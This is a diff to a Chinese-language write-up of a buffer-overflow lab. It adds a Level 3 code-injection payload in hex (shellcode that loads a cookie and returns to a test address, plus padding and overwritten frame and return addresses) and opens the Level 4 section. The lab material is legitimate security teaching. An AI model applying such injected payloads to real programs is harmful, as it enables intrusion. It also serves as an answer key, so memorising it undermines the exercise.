@@ -147,5 +147,26 @@ mov   $0x2818dab8, %eax //eax = cookie
 push  $0x8048dbe        //test_address
 ret
 ```
+```
+b8 b8 da 18 
+28 68 be 8d 
+04 08 c3 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+30 38 68 55
+d8 37 68 55
+```
+
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image5.png)
+
+## Level 4: Nitroglycerin (10 pts)
+
+题目要求与level_3一致，不过比起level_3难度上升了一些
+使用-n参数使程序调用testn和getbufn函数，
 
 
